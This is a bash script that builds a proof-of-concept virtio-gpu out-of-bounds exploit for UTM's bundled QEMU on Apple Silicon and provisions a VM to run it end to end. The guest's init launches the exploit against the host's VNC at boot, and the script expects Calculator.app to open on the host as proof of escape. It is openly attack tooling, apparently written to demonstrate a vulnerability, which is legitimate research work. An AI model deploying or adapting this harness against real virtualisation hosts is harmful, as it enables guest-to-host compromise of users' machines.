#!/bin/bash
#
# run_poc_utm.sh — Build the SPICE-safe virtio-gpu exploit and
# provision a UTM.app VM that runs it end-to-end.
#
# UTM bundles its own QEMU 10.0.2, so unlike run_poc_macos.sh we
# don't build QEMU here. We do build the exploit and pack a fresh
# initramfs, then write the UTM VM bundle (config.plist + data files).
#
# Usage:
#   ./run_poc_utm.sh             # install deps, build, provision VM
#   ./run_poc_utm.sh run         # start the VM via utmctl (if available)
#   ./run_poc_utm.sh stop        # stop the VM
#   ./run_poc_utm.sh clean       # remove VM bundle + work dir
#
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WORK_DIR="${TMPDIR:-/tmp}/qemu-utm-exploit"
ALPINE_BASE="https://dl-cdn.alpinelinux.org/alpine/v3.21/releases/aarch64/netboot"

UTM_DOCS="$HOME/Library/Containers/com.utmapp.UTM/Data/Documents"
UTMCTL="/Applications/UTM.app/Contents/MacOS/utmctl"
VM_NAME="exploit-test"
VM_DIR="$UTM_DOCS/$VM_NAME.utm"

# ---------- preflight ----------

preflight() {
    if [ "$(uname -s)" != "Darwin" ]; then
        echo "ERROR: this script is for macOS."
        exit 1
    fi
    if [ "$(uname -m)" != "arm64" ]; then
        echo "ERROR: Apple Silicon only — exploit offsets are arm64-specific."
        exit 1
    fi
    if [ ! -d "/Applications/UTM.app" ]; then
        echo "ERROR: UTM.app not found. Install from https://mac.getutm.app or the App Store."
        exit 1
    fi
    if [ ! -d "$UTM_DOCS" ]; then
        echo "ERROR: UTM container directory missing — launch UTM.app once so it initialises:"
        echo "  open -a UTM"
        exit 1
    fi
    if ! command -v brew >/dev/null 2>&1; then
        echo "ERROR: Homebrew not found. Install from https://brew.sh first."
        exit 1
    fi
}

# ---------- deps ----------

install_deps() {
    echo "=== Installing build dependencies ==="
    if ! command -v aarch64-linux-musl-gcc >/dev/null 2>&1; then
        echo "Installing aarch64-linux-musl cross-compiler..."
        brew tap filosottile/musl-cross 2>/dev/null || true
        brew install filosottile/musl-cross/musl-cross --with-aarch64
    fi
}

# ---------- exploit ----------

build_exploit() {
    echo "=== Building SPICE-safe exploit (exploit_utm.c) ==="
    cd "$SCRIPT_DIR"
    aarch64-linux-musl-gcc -static -O2 -o exploit_utm exploit_utm.c
    echo "Exploit: $SCRIPT_DIR/exploit_utm"
}

# ---------- guest assets ----------

prepare_guest() {
    echo "=== Preparing guest assets ==="
    mkdir -p "$WORK_DIR"

    local vmlinuz="$WORK_DIR/vmlinuz-virt"
    local alpine_initramfs="$WORK_DIR/initramfs-alpine"

    # Always download a matched kernel + initramfs from the same Alpine release;
    # mixing versions causes modprobe virtio_net to silently fail and the guest
    # loses its NIC (so the exploit can't reach the host's VNC at 10.0.2.2).
    if [ ! -f "$vmlinuz" ]; then
        echo "Downloading Alpine kernel..."
        curl -fL -o "$vmlinuz" "$ALPINE_BASE/vmlinuz-virt"
    fi
    if [ ! -f "$alpine_initramfs" ]; then
        echo "Downloading Alpine initramfs..."
        curl -fL -o "$alpine_initramfs" "$ALPINE_BASE/initramfs-virt"
    fi

    local ifs_dir="$WORK_DIR/initramfs_mod"
    rm -rf "$ifs_dir" && mkdir -p "$ifs_dir"
    (cd "$ifs_dir" && gunzip -c "$alpine_initramfs" | cpio -id 2>/dev/null) || true

    mkdir -p "$ifs_dir/bin"
    cp "$SCRIPT_DIR/exploit_utm" "$ifs_dir/bin/exploit"
    chmod +x "$ifs_dir/bin/exploit"

    cat > "$ifs_dir/init" << 'INITEOF'
#!/bin/sh
/bin/busybox --install -s 2>/dev/null
export PATH="/usr/bin:/bin:/usr/sbin:/sbin"

mount -t proc proc /proc 2>/dev/null
mount -t sysfs sysfs /sys 2>/dev/null
mount -t devtmpfs devtmpfs /dev 2>/dev/null

echo "====================================="
echo "  virtio-gpu OOB exploit guest (UTM)"
echo "====================================="

sleep 1
modprobe virtio_net 2>/dev/null
sleep 1

ip link set lo up 2>/dev/null
ip link set eth0 up 2>/dev/null
ip addr add 10.0.2.15/24 dev eth0 2>/dev/null
ip route add default via 10.0.2.2 2>/dev/null
sleep 2

/bin/exploit
echo "Exploit finished (exit code: $?). Dropping to shell."
exec /bin/sh
INITEOF
    chmod +x "$ifs_dir/init"

    (cd "$ifs_dir" && find . | cpio -o -H newc 2>/dev/null | gzip > "$WORK_DIR/initramfs-exploit.gz")
    echo "Initramfs: $WORK_DIR/initramfs-exploit.gz ($(du -h "$WORK_DIR/initramfs-exploit.gz" | cut -f1))"
    echo "Kernel:    $vmlinuz"
}

# ---------- UTM VM bundle ----------

provision_vm() {
    echo "=== Provisioning UTM VM '$VM_NAME' ==="

    if [ -d "$VM_DIR" ]; then
        echo "VM bundle already exists; refreshing kernel + initramfs in place."
        cp "$WORK_DIR/vmlinuz-virt"        "$VM_DIR/Data/vmlinuz-virt"
        cp "$WORK_DIR/initramfs-exploit.gz" "$VM_DIR/Data/initramfs-exploit.gz"
        echo "Done. Open UTM and start '$VM_NAME', or run: $0 run"
        return
    fi

    local uuid mac
    uuid=$(uuidgen)
    mac=$(printf '1e:%02x:%02x:%02x:%02x:%02x' \
        $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) \
        $((RANDOM%256)) $((RANDOM%256)))

    mkdir -p "$VM_DIR/Data"
    cp "$WORK_DIR/vmlinuz-virt"        "$VM_DIR/Data/vmlinuz-virt"
    cp "$WORK_DIR/initramfs-exploit.gz" "$VM_DIR/Data/initramfs-exploit.gz"

    cat > "$VM_DIR/config.plist" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Backend</key>
	<string>QEMU</string>
	<key>ConfigurationVersion</key>
	<integer>4</integer>
	<key>Display</key>
	<array/>
	<key>Drive</key>
	<array>
		<dict>
			<key>Identifier</key>
			<string>$(uuidgen)</string>
			<key>ImageName</key>
			<string>vmlinuz-virt</string>
			<key>ImageType</key>
			<string>LinuxKernel</string>
			<key>Interface</key>
			<string>None</string>
			<key>InterfaceVersion</key>
			<integer>1</integer>
			<key>ReadOnly</key>
			<true/>
		</dict>
		<dict>
			<key>Identifier</key>
			<string>$(uuidgen)</string>
			<key>ImageName</key>
			<string>initramfs-exploit.gz</string>
			<key>ImageType</key>
			<string>LinuxInitrd</string>
			<key>Interface</key>
			<string>None</string>
			<key>InterfaceVersion</key>
			<integer>1</integer>
			<key>ReadOnly</key>
			<true/>
		</dict>
	</array>
	<key>Information</key>
	<dict>
		<key>Icon</key>
		<string>linux</string>
		<key>IconCustom</key>
		<false/>
		<key>Name</key>
		<string>$VM_NAME</string>
		<key>UUID</key>
		<string>$uuid</string>
	</dict>
	<key>Input</key>
	<dict>
		<key>MaximumUsbShare</key>
		<integer>3</integer>
		<key>UsbBusSupport</key>
		<string>2.0</string>
		<key>UsbSharing</key>
		<false/>
	</dict>
	<key>Network</key>
	<array>
		<dict>
			<key>Hardware</key>
			<string>virtio-net-pci</string>
			<key>IsolateFromHost</key>
			<false/>
			<key>MacAddress</key>
			<string>$mac</string>
			<key>Mode</key>
			<string>Emulated</string>
			<key>PortForward</key>
			<array/>
		</dict>
	</array>
	<key>QEMU</key>
	<dict>
		<key>AdditionalArguments</key>
		<array>
			<string>-device</string>
			<string>virtio-gpu-pci</string>
			<string>-vnc</string>
			<string>127.0.0.1:0</string>
			<string>-nographic</string>
			<string>-append</string>
			<string>UTMAPP</string>
		</array>
		<key>BalloonDevice</key>
		<true/>
		<key>DebugLog</key>
		<false/>
		<key>Hypervisor</key>
		<true/>
		<key>PS2Controller</key>
		<false/>
		<key>RNGDevice</key>
		<true/>
		<key>RTCLocalTime</key>
		<false/>
		<key>TPMDevice</key>
		<false/>
		<key>TSO</key>
		<false/>
		<key>UEFIBoot</key>
		<false/>
	</dict>
	<key>Serial</key>
	<array>
		<dict>
			<key>Mode</key>
			<string>Terminal</string>
			<key>Target</key>
			<string>Auto</string>
			<key>Terminal</key>
			<dict>
				<key>BackgroundColor</key>
				<string>#000000</string>
				<key>CursorBlink</key>
				<true/>
				<key>Font</key>
				<string>Menlo</string>
				<key>FontSize</key>
				<integer>12</integer>
				<key>ForegroundColor</key>
				<string>#ffffff</string>
			</dict>
		</dict>
	</array>
	<key>Sharing</key>
	<dict>
		<key>ClipboardSharing</key>
		<false/>
		<key>DirectoryShareMode</key>
		<string>None</string>
		<key>DirectoryShareReadOnly</key>
		<false/>
	</dict>
	<key>Sound</key>
	<array/>
	<key>System</key>
	<dict>
		<key>Architecture</key>
		<string>aarch64</string>
		<key>CPU</key>
		<string>host</string>
		<key>CPUCount</key>
		<integer>0</integer>
		<key>CPUFlagsAdd</key>
		<array/>
		<key>CPUFlagsRemove</key>
		<array/>
		<key>ForceMulticore</key>
		<false/>
		<key>JITCacheSize</key>
		<integer>0</integer>
		<key>MemorySize</key>
		<integer>512</integer>
		<key>Target</key>
		<string>virt</string>
	</dict>
</dict>
</plist>
PLIST

    echo "VM bundle: $VM_DIR"
}

# ---------- run / stop ----------

run_vm() {
    [ -d "$VM_DIR" ] || { echo "ERROR: VM not provisioned. Run: $0"; exit 1; }

    # UTM only enumerates VM bundles at launch or when one is explicitly
    # opened. A freshly-provisioned bundle is invisible to utmctl until
    # UTM has been told about it, hence the launch-then-open dance.
    if ! pgrep -x UTM >/dev/null 2>&1; then
        echo "Launching UTM.app..."
        open -a UTM
        sleep 3
    fi

    if [ -x "$UTMCTL" ] && ! "$UTMCTL" list 2>/dev/null | grep -q "$VM_NAME"; then
        echo "Registering '$VM_NAME' with UTM..."
        open "$VM_DIR"
        # Give UTM a moment to import; poll utmctl rather than guessing.
        for _ in 1 2 3 4 5 6 7 8 9 10; do
            "$UTMCTL" list 2>/dev/null | grep -q "$VM_NAME" && break
            sleep 1
        done
    fi

    if [ -x "$UTMCTL" ]; then
        echo "Starting '$VM_NAME' via utmctl..."
        if "$UTMCTL" start "$VM_NAME"; then
            echo "VM started. Calculator.app should open within ~30 seconds."
            echo "Watch the serial console in UTM for exploit progress."
        else
            echo "utmctl start failed. Open UTM.app and start '$VM_NAME' manually."
            exit 1
        fi
    else
        echo "utmctl not found. Open UTM.app and start '$VM_NAME' manually."
    fi
}

stop_vm() {
    if [ -x "$UTMCTL" ]; then
        "$UTMCTL" stop "$VM_NAME" 2>/dev/null || true
    fi
}

# ---------- main ----------

case "${1:-build}" in
    run)   run_vm ;;
    stop)  stop_vm ;;
    clean)
        stop_vm
        echo "Removing $VM_DIR"
        rm -rf "$VM_DIR"
        echo "Removing $WORK_DIR"
        rm -rf "$WORK_DIR"
        rm -f "$SCRIPT_DIR/exploit_utm"
        ;;
    build|"")
        preflight
        install_deps
        build_exploit
        prepare_guest
        provision_vm
        echo
        echo "=== Build complete ==="
        echo "Start the VM with: $0 run"
        echo "Or open UTM.app and click '$VM_NAME'."
        ;;
    *)
        echo "Usage: $0 [build|run|stop|clean]"
        exit 1
        ;;
esac
